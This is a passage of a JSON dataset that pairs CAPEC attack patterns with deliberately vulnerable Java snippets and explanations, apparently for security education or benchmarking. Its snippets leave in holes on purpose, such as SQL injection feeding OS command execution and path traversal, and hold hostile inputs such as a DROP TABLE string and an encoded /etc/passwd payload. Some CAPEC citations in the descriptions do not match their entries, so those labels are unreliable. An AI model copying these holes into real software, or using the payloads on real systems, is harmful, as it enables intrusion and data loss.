        "description": "This Java servlet code snippet demonstrates a vulnerability to Cross Site Tracing (XST). The doGet method checks if the HTTP method is TRACE and attempts to block it, but the doTrace method explicitly allows TRACE requests, which is a security flaw (CWE-693 and CWE-648). Additionally, the doGet method improperly neutralizes user input (CWE-79) by directly writing it to the response without sanitization, making it susceptible to Cross-Site Scripting (XSS) attacks. This code represents the main idea of CAPEC-111, where an adversary can exploit the TRACE method to steal session cookies and other sensitive information."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class VulnerableSQLInjection {\n    public static void main(String[] args) {\n        String userInput = \"'; DROP TABLE users; --\"; // Simulated malicious input\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try {\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"user\", \"password\");\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n\n            while (rs.next()) {\n                String command = rs.getString(\"command\");\n                Runtime.getRuntime().exec(command); // Vulnerable to OS Command Injection\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an attacker can inject SQL commands through user input, leading to SQL Injection (CWE-89). The injected SQL command is used to fetch data from the database, which is then executed as an OS command without proper validation (CWE-78). This represents the CAPEC scenario where malicious data is injected into the database and later used as command line arguments, leading to potential command execution on the host system. The code does not neutralize special elements in the SQL command or the OS command, making it susceptible to both SQL Injection and OS Command Injection."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "import org.hibernate.Session;\nimport org.hibernate.query.Query;\n\npublic class ORMInjectionExample {\n    public void getUserData(Session session, String userId) {\n        // Vulnerable code: Directly using user input in HQL query\n        String hql = \"FROM User WHERE id = '\" + userId + \"'\";\n        Query query = session.createQuery(hql);\n        query.list();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to Object Relational Mapping (ORM) Injection using Hibernate. The `getUserData` method takes a Hibernate `Session` and a `userId` as input. It constructs an HQL (Hibernate Query Language) query by directly concatenating the `userId` into the query string. This approach is vulnerable to SQL injection because an attacker can manipulate the `userId` input to alter the query's logic or execute arbitrary SQL commands. The code embodies the main idea of CAPEC-20, CAPEC-89, CAPEC-564, CAPEC-943, and CAPEC-1083 by showing improper input validation and improper neutralization of special elements in the data query logic."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "import javax.xml.soap.*;\nimport java.sql.*;\n\npublic class SOAPSQLInjectionExample {\n    public static void main(String[] args) throws Exception {\n        // Simulate receiving a SOAP message\n        String soapMessage = \"<soap:Envelope xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>\"\n                + \"<soap:Body>\"\n                + \"<getUserData>\"\n                + \"<userId>1 OR 1=1</userId>\"\n                + \"</getUserData>\"\n                + \"</soap:Body>\"\n                + \"</soap:Envelope>\";\n\n        // Parse the SOAP message\n        SOAPMessage message = MessageFactory.newInstance().createMessage(null, new java.io.ByteArrayInputStream(soapMessage.getBytes()));\n        SOAPBody body = message.getSOAPBody();\n        String userId = body.getElementsByTagName(\"userId\").item(0).getTextContent();\n\n        // Vulnerable SQL query construction\n        String query = \"SELECT * FROM users WHERE id = '\" + userId + \"'\";\n\n        // Database connection setup (example, not secure)\n        Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"user\", \"password\");\n        Statement stmt = conn.createStatement();\n\n        // Execute the query\n        ResultSet rs = stmt.executeQuery(query);\n\n        // Process the result set\n        while (rs.next()) {\n            System.out.println(\"User: \" + rs.getString(\"username\"));\n        }\n\n        // Close resources\n        rs.close();\n        stmt.close();\n        conn.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a SQL Injection vulnerability through SOAP parameter tampering. The code simulates receiving a SOAP message containing a userId parameter, which is then extracted and used directly in an SQL query without proper validation or parameter binding. This allows an attacker to inject malicious SQL code through the userId parameter, potentially gaining unauthorized access to the database. The code highlights the importance of proper input validation and the use of prepared statements to prevent SQL Injection attacks."
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class JsonHijackingVulnerableServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String callback = request.getParameter(\"callback\");\n        String jsonResponse = \"{\\\"user\\\": \\\"admin\\\", \\\"role\\\": \\\"superuser\\\"}\";\n\n        // Vulnerable to JSON Hijacking\n        response.setContentType(\"application/javascript\");\n        response.getWriter().write(callback + \"(\" + jsonResponse + \");\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to JSON Hijacking. The servlet responds to a GET request by returning a JSON object wrapped in a JavaScript callback function, which is specified by the 'callback' parameter. This pattern is commonly used in JSONP (JSON with Padding) to circumvent cross-origin restrictions. However, it is vulnerable to JSON Hijacking because it allows an attacker to include and execute the JSON response in the context of another website, exploiting the browser's Same Origin Policy loophole. The code does not verify the authenticity of the 'callback' parameter (CWE-345, CWE-346), making it susceptible to Cross-Site Request Forgery (CWE-352) and Cross-Site Scripting (CWE-79). Additionally, it relies on client-side enforcement of security (CWE-602), which is inadequate."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "import java.util.Random;\n\npublic class WeakAuthentication {\n    private static final int MAX_ATTEMPTS = 1000;\n    private static final String SECRET = \"password123\";\n    private static final Random random = new Random();\n\n    public static void main(String[] args) {\n        for (int i = 0; i < MAX_ATTEMPTS; i++) {\n            String attempt = generateRandomPassword();\n            if (authenticate(attempt)) {\n                System.out.println(\"Access granted with password: \" + attempt);\n                return;\n            }\n        }\n        System.out.println(\"Access denied after \" + MAX_ATTEMPTS + \" attempts.\");\n    }\n\n    private static boolean authenticate(String password) {\n        return SECRET.equals(password);\n    }\n\n    private static String generateRandomPassword() {\n        int length = 10;\n        StringBuilder password = new StringBuilder(length);\n        for (int i = 0; i < length; i++) {\n            password.append((char) (random.nextInt(26) + 'a'));\n        }\n        return password.toString();\n    }\n}",
        "description": "This Java code snippet demonstrates a weak authentication mechanism that is vulnerable to brute force attacks. The `authenticate` method checks if a given password matches a hardcoded secret (`SECRET`). The `main` method attempts to brute force the password by generating random passwords up to a maximum number of attempts (`MAX_ATTEMPTS`). The `generateRandomPassword` method creates a random 10-character password using insufficiently random values. This code embodies the main idea of the CAPEC by showing how an attacker could use trial-and-error to guess the password. It also highlights related CWEs: weak password requirements (CWE-521), use of insufficiently random values (CWE-330), and improper restriction of excessive authentication attempts (CWE-307)."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class InterfaceManipulationExample {\n    private static final String DEBUG_MODE_FILE = \"/sys/hardware/debug_mode\";\n    private static final String REGISTER_FILE = \"/sys/hardware/register\";\n\n    public static void main(String[] args) {\n        try {\n            // Improper Access Control for Register Interface (CWE-1262)\n            String registerValue = new String(Files.readAllBytes(Paths.get(REGISTER_FILE)));\n            System.out.println(\"Register Value: \" + registerValue);\n\n            // Exposed IOCTL with Insufficient Access Control (CWE-782)\n            if (args.length > 0 && args[0].equals(\"enable_debug\")) {\n                enableDebugMode();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void enableDebugMode() throws IOException {\n        // Hardware Allows Activation of Test or Debug Logic at Runtime (CWE-1313)\n        Files.write(Paths.get(DEBUG_MODE_FILE), \"1\".getBytes());\n        System.out.println(\"Debug mode enabled.\");\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can manipulate hardware interfaces due to improper access control and exposed IOCTLs. The code reads a value from a hardware register file without proper access control (CWE-1262). Additionally, it allows enabling debug mode at runtime through an exposed IOCTL without sufficient access control (CWE-782 and CWE-1313). This represents the main idea of CAPEC-Interface Manipulation, where an adversary can manipulate the use or processing of an interface to compromise the system's security."
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class AuthenticationAbuseExample {\n    private static Map<String, String> users = new HashMap<>();\n    private static int failedAttempts = 0;\n    private static final int MAX_ATTEMPTS = 5;\n\n    static {\n        // Adding a user with a weak password\n        users.put(\"admin\", \"password\");\n    }\n\n    public static boolean authenticate(String username, String password) {\n        if (failedAttempts >= MAX_ATTEMPTS) {\n            System.out.println(\"Too many failed attempts. Try again later.\");\n            return false;\n        }\n\n        if (users.containsKey(username) && users.get(username).equals(password)) {\n            System.out.println(\"Authentication successful!\");\n            return true;\n        } else {\n            failedAttempts++;\n            System.out.println(\"Authentication failed.\");\n            return false;\n        }\n    }\n\n    public static void main(String[] args) {\n        // Simulating authentication attempts\n        authenticate(\"admin\", \"wrongpassword\"); // Failed attempt 1\n        authenticate(\"admin\", \"wrongpassword\"); // Failed attempt 2\n        authenticate(\"admin\", \"wrongpassword\"); // Failed attempt 3\n        authenticate(\"admin\", \"wrongpassword\"); // Failed attempt 4\n        authenticate(\"admin\", \"wrongpassword\"); // Failed attempt 5\n        authenticate(\"admin\", \"password\"); // Should be blocked due to too many attempts\n    }\n}",
        "description": "This Java code snippet demonstrates an authentication mechanism that is vulnerable to several weaknesses described in the CAPEC and related CWEs. The `authenticate` method checks a username and password against a hardcoded user list. The code includes a weak password ('password') for the 'admin' user, representing CWE-1390 (Weak Authentication). The code also tracks failed authentication attempts but does not implement a robust mechanism to handle excessive attempts, representing CWE-307 (Improper Restriction of Excessive Authentication Attempts). After five failed attempts, the system blocks further attempts, but this simplistic approach can be bypassed or exploited. The code embodies the main idea of CAPEC-Authentication Abuse by showing how an attacker could exploit weak authentication and insufficient brute force protection to gain unauthorized access."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "import java.util.Scanner;\n\npublic class AuthBypassExample {\n    private static boolean isAuthenticated = false;\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String password = scanner.nextLine();\n\n        // Improper Authentication: Weak check for admin user\n        if (username.equals(\"admin\") && password.equals(\"admin123\")) {\n            isAuthenticated = true;\n        }\n\n        // Authentication Bypass by Assumed-Immutable Data\n        System.out.print(\"Enter user role: \");\n        String role = scanner.nextLine();\n        if (role.equals(\"admin\")) {\n            isAuthenticated = true;\n        }\n\n        // Authentication Bypass Using an Alternate Path or Channel\n        System.out.print(\"Enter secret key: \");\n        String secretKey = scanner.nextLine();\n        if (secretKey.equals(\"SECRET_KEY\")) {\n            isAuthenticated = true;\n        }\n\n        if (isAuthenticated) {\n            System.out.println(\"Access granted. Welcome, \" + username + \"!\");\n        } else {\n            System.out.println(\"Access denied. Invalid credentials.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an authentication bypass vulnerability. The code includes several weaknesses: \n1. Improper Authentication (CWE-287): The authentication check for the admin user is weak and easily guessable.\n2. Authentication Bypass by Assumed-Immutable Data (CWE-302): The role input is assumed to be immutable, but an attacker can manipulate it to gain access.\n3. Authentication Bypass Using an Alternate Path or Channel (CWE-288): The secret key provides an alternate path to bypass authentication.\n\nThe code allows an attacker to gain access by either guessing weak credentials, manipulating the role, or using a secret key, thus bypassing the intended authentication mechanism."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "import java.io.*;\nimport java.util.*;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        // CWE-426: Untrusted Search Path\n        String filePath = args[0];\n        try {\n            // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            File file = new File(filePath);\n            Scanner scanner = new Scanner(file);\n            while (scanner.hasNextLine()) {\n                String data = scanner.nextLine();\n                System.out.println(data); // Potentially sensitive information exposed\n            }\n            scanner.close();\n        } catch (FileNotFoundException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // CWE-1243: Sensitive Non-Volatile Information Not Protected During Debug\n    public static void debugSensitiveInfo() {\n        String sensitiveInfo = \"Sensitive Debug Info\";\n        System.out.println(sensitiveInfo); // Exposing sensitive information during debug\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that embodies the main idea of CAPEC-170 (Excavation). The application reads and prints the contents of a file specified by an external input (CWE-426: Untrusted Search Path), potentially exposing sensitive information to unauthorized actors (CWE-200: Exposure of Sensitive Information to an Unauthorized Actor). Additionally, the debugSensitiveInfo method exposes sensitive information during debugging (CWE-1243: Sensitive Non-Volatile Information Not Protected During Debug). This code represents how an adversary might probe a system to extract sensitive information for malicious purposes."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.Socket;\n\npublic class VulnerableClient {\n    public static void main(String[] args) {\n        String serverAddress = \"example.com\";\n        int port = 80;\n        try (Socket socket = new Socket(serverAddress, port);\n             OutputStreamWriter out = new OutputStreamWriter(socket.getOutputStream());\n             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {\n\n            // Sending sensitive information in cleartext\n            String sensitiveData = \"username=admin&password=admin123\";\n            out.write(\"POST /login HTTP/1.1\\r\\n\");\n            out.write(\"Host: \" + serverAddress + \"\\r\\n\");\n            out.write(\"Content-Length: \" + sensitiveData.length() + \"\\r\\n\");\n            out.write(\"Content-Type: application/x-www-form-urlencoded\\r\\n\\r\\n\");\n            out.write(sensitiveData);\n            out.flush();\n\n            // Reading response without verifying integrity\n            String responseLine;\n            while ((responseLine = in.readLine()) != null) {\n                System.out.println(responseLine);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable client that sends sensitive information (username and password) in cleartext over an HTTP connection. The code connects to a server, sends a POST request with sensitive data, and reads the response without verifying its integrity. This embodies the main idea of CAPEC-160 (Interception) by transmitting sensitive information in a way that can be easily intercepted by an adversary. The related CWEs are represented as follows: CWE-319 (Cleartext Transmission of Sensitive Information) is shown by sending the username and password in cleartext, and CWE-924 (Improper Enforcement of Message Integrity During Transmission) is demonstrated by the lack of integrity checks on the received response."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "import java.net.URLDecoder;\nimport java.nio.charset.StandardCharsets;\n\npublic class DoubleEncodingExample {\n    public static void main(String[] args) {\n        String input = \"%252E%252E%252F%252E%252E%252Fetc%252Fpasswd\"; // Double encoded payload\n        String decodedOnce = URLDecoder.decode(input, StandardCharsets.UTF_8);\n        String decodedTwice = URLDecoder.decode(decodedOnce, StandardCharsets.UTF_8);\n\n        // Simulate a filter that only decodes once and checks for illegal characters\n        if (decodedOnce.contains(\"../\")) {\n            System.out.println(\"Blocked: Potential path traversal detected\");\n        } else {\n            // Vulnerable code: does not detect double encoding\n            System.out.println(\"Allowed: \" + decodedTwice);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to double encoding. The input string is a double-encoded payload that represents a path traversal attack. The code decodes the input string twice, simulating how an attacker might bypass a filter that only decodes once. The filter checks for illegal characters after a single decoding, but fails to detect the malicious payload when it is double-encoded. This example highlights the importance of proper handling of alternate encodings (CWE-173), improper handling of URL encoding (CWE-177), and improper input validation (CWE-20)."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "public class ProductionSystem {\n    private boolean debugMode = true; // CWE-489: Active Debug Code\n\n    public void processRequest(String request) {\n        if (debugMode) {\n            System.out.println(\"Debug Info: Processing request: \" + request); // CWE-1295: Debug Messages Revealing Unnecessary Information\n        }\n        // Process the request\n    }\n\n    public static void main(String[] args) {\n        ProductionSystem system = new ProductionSystem();\n        system.processRequest(\"Sample Request\");\n    }\n}",
        "description": "This Java code snippet represents a production system with an active debug mode, which is a common vulnerability described in CAPEC-0022: Exploit Non-Production Interfaces. The 'debugMode' flag is set to true, indicating that debug code is still enabled in the production environment (CWE-489). When processing a request, the system prints debug information, potentially revealing sensitive data (CWE-1295). This code demonstrates how an adversary could exploit such a non-production interface to glean information or leverage functionality that should not be available in a production system."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "public class PrivilegeAbuseExample {\n    private boolean isAdmin;\n    private String sensitiveData = \"Top Secret Data\";\n\n    public PrivilegeAbuseExample(boolean isAdmin) {\n        this.isAdmin = isAdmin;\n    }\n\n    public String getSensitiveData() {\n        if (isAdmin) {\n            return sensitiveData;\n        } else {\n            // CWE-284: Improper Access Control\n            // CWE-269: Improper Privilege Management\n            // CWE-732: Incorrect Permission Assignment for Critical Resource\n            return sensitiveData; // Vulnerability: Non-admin users can access sensitive data\n        }\n    }\n\n    public static void main(String[] args) {\n        PrivilegeAbuseExample user = new PrivilegeAbuseExample(false);\n        System.out.println(\"User access: \" + user.getSensitiveData());\n\n        PrivilegeAbuseExample admin = new PrivilegeAbuseExample(true);\n        System.out.println(\"Admin access: \" + admin.getSensitiveData());\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where a non-admin user can access sensitive data that should be restricted to admin users only. The `getSensitiveData` method incorrectly allows access to `sensitiveData` regardless of the user's privilege level, embodying the concept of 'Privilege Abuse' (CAPEC). This is a clear example of CWE-284 (Improper Access Control), CWE-269 (Improper Privilege Management), and CWE-732 (Incorrect Permission Assignment for Critical Resource). The code fails to properly enforce access control, allowing unauthorized users to access sensitive information."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "public class BufferManipulationExample {\n    public static void main(String[] args) {\n        int bufferSize = 10;\n        char[] buffer = new char[bufferSize];\n        String input = \"This input is too long for the buffer\";\n\n        // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n        for (int i = 0; i <= input.length(); i++) {\n            buffer[i] = input.charAt(i); // Potential buffer overflow\n        }\n\n        // CWE-126: Buffer Over-read\n        for (int i = 0; i <= bufferSize; i++) {\n            System.out.print(buffer[i]); // Potential buffer over-read\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer manipulation vulnerability by improperly handling buffer boundaries. The code initializes a buffer of size 10 and attempts to copy a longer input string into it, leading to a buffer overflow (CWE-119). Additionally, it reads beyond the buffer's bounds, causing a buffer over-read (CWE-126). This example embodies the main idea of CAPEC-1000 by showing how an adversary can manipulate buffer operations to read or modify unintended memory locations."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "import java.util.concurrent.locks.ReentrantLock;\n\npublic class SharedResourceManipulation {\n    private static int sharedResource = 0;\n    private static ReentrantLock lock = new ReentrantLock();\n\n    public static void main(String[] args) {\n        Thread thread1 = new Thread(() -> manipulateResource());\n        Thread thread2 = new Thread(() -> manipulateResource());\n\n        thread1.start();\n        thread2.start();\n    }\n\n    private static void manipulateResource() {\n        for (int i = 0; i < 1000; i++) {\n            if (lock.tryLock()) {\n                try {\n                    // Critical section\n                    sharedResource++;\n                    System.out.println(Thread.currentThread().getName() + \" incremented sharedResource to \" + sharedResource);\n                } finally {\n                    lock.unlock();\n                }\n            } else {\n                // Simulate improper synchronization by accessing the shared resource without locking\n                sharedResource++;\n                System.out.println(Thread.currentThread().getName() + \" unsafely incremented sharedResource to \" + sharedResource);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where multiple threads manipulate a shared resource, `sharedResource`, without proper synchronization. The `ReentrantLock` is used to control access to the critical section, but the `tryLock` method is used to simulate improper synchronization. If the lock is not acquired, the thread increments the shared resource without proper synchronization, leading to potential race conditions and data corruption. This embodies the main idea of CAPEC-662 (Improper Synchronization) and highlights the risks associated with shared resource manipulation in a multi-threaded environment."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class FloodingVulnerableServer {\n    private static final int PORT = 8080;\n    private static final int MAX_THREADS = 1000; // No proper limit\n    private static ExecutorService threadPool = Executors.newFixedThreadPool(MAX_THREADS);\n\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(PORT)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                threadPool.submit(() -> handleRequest(clientSocket));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void handleRequest(Socket clientSocket) {\n        try {\n            // Simulate handling request\n            Thread.sleep(1000); // Simulate some work\n            clientSocket.close();\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server that is vulnerable to a flooding attack. The server listens on port 8080 and uses a thread pool to handle incoming client connections. However, the thread pool is configured with a very high limit (MAX_THREADS = 1000) without proper throttling or resource management. This can lead to resource exhaustion if an adversary sends a large number of requests in a short period, consuming all available threads and preventing legitimate users from accessing the service. This example embodies the main idea of the CAPEC 'Flooding' attack and highlights related CWEs such as 'Allocation of Resources Without Limits or Throttling' (CWE-770) and 'Uncontrolled Resource Consumption' (CWE-400)."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "import java.io.*;\n\npublic class PathTraversalExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PathTraversalExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        String basePath = \"/var/www/uploads/\";\n        File file = new File(basePath + filename);\n\n        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a path traversal vulnerability. The program takes a filename as a command-line argument and attempts to read and print the contents of the file located in the '/var/www/uploads/' directory. However, it does not properly validate or sanitize the input filename, allowing an attacker to use sequences like '../' to traverse directories and access files outside the intended directory. For example, an attacker could provide '../../etc/passwd' as the filename to read the system's password file. This code embodies the main idea of the CAPEC by showing how insufficient input validation can lead to unauthorized file access."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.PrintWriter;\n\npublic class DirectoryListingServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String dirPath = request.getParameter(\"dir\");\n        if (dirPath == null) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Missing directory parameter\");\n            return;\n        }\n\n        File dir = new File(dirPath);\n        if (!dir.exists() || !dir.isDirectory()) {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND, \"Directory not found\");\n            return;\n        }\n\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<h1>Directory Listing</h1>\");\n        out.println(\"<ul>\");\n        for (File file : dir.listFiles()) {\n            out.println(\"<li>\" + file.getName() + \"</li>\");\n        }\n        out.println(\"</ul>\");\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation of directory indexing. The servlet takes a 'dir' parameter from the HTTP request, which specifies the directory to be listed. If the directory exists and is valid, it lists the contents of the directory in an HTML response. This code is vulnerable to directory indexing attacks because it does not perform proper authorization checks (CWE-285), does not protect alternate paths (CWE-424), and may expose sensitive files and directories to unauthorized users (CWE-425). An attacker can exploit this by crafting requests to explore the directory tree and access sensitive information."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "public class IntegerAttackExample {\n    public static void main(String[] args) {\n        int maxValue = Integer.MAX_VALUE;\n        int result = maxValue + 1; // Integer overflow\n        System.out.println(\"Result: \" + result);\n\n        int negativeValue = -1;\n        int extendedValue = (short) negativeValue; // Unexpected sign extension\n        System.out.println(\"Extended Value: \" + extendedValue);\n\n        int value = 100;\n        if (value <= 200) { // Numeric range comparison without minimum check\n            System.out.println(\"Value is within range.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several types of integer attacks as described in the CAPEC and related CWEs. \n\n1. **Integer Overflow (CWE-190)**: The code adds 1 to `Integer.MAX_VALUE`, causing an overflow and resulting in a negative number. This can lead to unexpected behavior in applications that do not handle such cases.\n\n2. **Unexpected Sign Extension (CWE-194)**: The code casts a negative integer to a `short`, which can cause unexpected sign extension when the value is used in a larger data type.\n\n3. **Numeric Range Comparison Without Minimum Check (CWE-839)**: The code checks if a value is less than or equal to a maximum but does not verify if it is greater than or equal to a minimum, potentially allowing invalid values to pass the check.\n\nThese examples illustrate how improper handling of integer values can lead to vulnerabilities in software applications."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "public class PointerManipulationExample {\n    public static void main(String[] args) {\n        int[] array = new int[10];\n        int index = getIndexFromUntrustedSource(); // CWE-822: Untrusted Pointer Dereference\n        \n        // CWE-823: Use of Out-of-range Pointer Offset\n        if (index >= 0 && index < array.length) {\n            array[index] = 42; // Safe access\n        } else {\n            // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n            // CWE-476: NULL Pointer Dereference\n            System.out.println(\"Error: Index out of bounds\");\n        }\n    }\n\n    private static int getIndexFromUntrustedSource() {\n        // Simulate getting an index from an untrusted source\n        return 15; // This is an out-of-bounds index\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an untrusted index is used to access an array, embodying the main idea of the CAPEC 'Pointer Manipulation'. The code includes checks to prevent out-of-bounds access (CWE-823) and handles the error case where the index is out of bounds (CWE-119). The untrusted index is obtained from a method simulating an untrusted source (CWE-822). If the index is out of bounds, an error message is printed, avoiding a potential NULL pointer dereference (CWE-476). This example highlights the importance of validating indices obtained from untrusted sources to prevent unintended memory access."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "import java.util.ArrayList;\nimport java.util.List;\n\npublic class ExcessiveAllocationExample {\n    private List<byte[]> memoryHog = new ArrayList<>();\n\n    public void allocateMemory(int size) {\n        // CWE-770: No limit on the size of memory allocation\n        byte[] block = new byte[size];\n        memoryHog.add(block);\n    }\n\n    public static void main(String[] args) {\n        ExcessiveAllocationExample example = new ExcessiveAllocationExample();\n        // CWE-400: Uncontrolled resource consumption\n        // Allocate a very large amount of memory in a single request\n        example.allocateMemory(Integer.MAX_VALUE - 8);\n    }\n}",
        "description": "This Java code snippet demonstrates an excessive allocation vulnerability. The `allocateMemory` method allows for the allocation of a large block of memory without any limits or checks (CWE-770). In the `main` method, a very large memory block is allocated in a single request (CWE-400), which can lead to resource exhaustion. This embodies the main idea of the CAPEC by showing how a single, carefully crafted request can cause the target to allocate excessive resources, potentially degrading or denying service to legitimate users."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class ResourceLeakExample {\n    public static void main(String[] args) {\n        BufferedReader reader = null;\n        try {\n            reader = new BufferedReader(new FileReader(\"example.txt\"));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            // Improper resource shutdown or release\n            // Missing release of resource after effective lifetime\n            // This can lead to resource leak\n            // if (reader != null) {\n            //     try {\n            //         reader.close();\n            //     } catch (IOException e) {\n            //         e.printStackTrace();\n            //     }\n            // }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a resource leak vulnerability. The code attempts to read a file using a BufferedReader but fails to properly release the resource in the finally block. The commented-out section shows the correct way to release the resource, but as it stands, the BufferedReader is not closed, leading to a resource leak. This can deplete the number of file handles available to the system, affecting the ability to service legitimate requests. This example embodies the main idea of CAPEC-404 (Resource Leak Exposure) and related CWEs such as CWE-404 (Improper Resource Shutdown or Release) and CWE-772 (Missing Release of Resource after Effective Lifetime)."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class SymlinkAttackExample {\n    public static void main(String[] args) {\n        String userInputPath = \"/tmp/userfile\"; // This should be user-controlled input\n        try {\n            // Check if the file is a symbolic link\n            Path path = Paths.get(userInputPath);\n            if (Files.isSymbolicLink(path)) {\n                System.out.println(\"Error: The file is a symbolic link.\");\n                return;\n            }\n\n            // Open the file (potentially vulnerable to race condition)\n            try (BufferedReader reader = new BufferedReader(new FileReader(userInputPath))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    System.out.println(line);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability to a symlink attack. The code attempts to read a file specified by a user-controlled input path. It first checks if the file is a symbolic link and aborts if it is. However, this check is not sufficient to prevent a race condition where an attacker could replace the file with a symbolic link after the check but before the file is opened. This represents CWE-59 (Improper Link Resolution Before File Access), CWE-61 (UNIX Symbolic Link Following), and CWE-363 (Race Condition Enabling Link Following). The code highlights the risk of accessing files based on user input without proper validation and handling of symbolic links."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
